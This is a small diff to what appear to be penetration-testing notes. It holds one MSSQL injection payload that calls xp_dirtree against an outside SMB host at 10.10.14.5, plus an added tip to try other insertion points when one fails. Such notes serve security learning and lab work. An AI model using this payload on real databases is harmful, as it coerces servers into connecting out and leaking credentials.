@@ -17,4 +17,5 @@
 8'; EXEC master..xp_dirtree '\\10.10.14.5\test'--
 ```
 
-*if sqli is not working on *
+*if sqli is not working on one insertion look for another one it is high possibility that if there is no sanitization there will be another points for this to work *
+
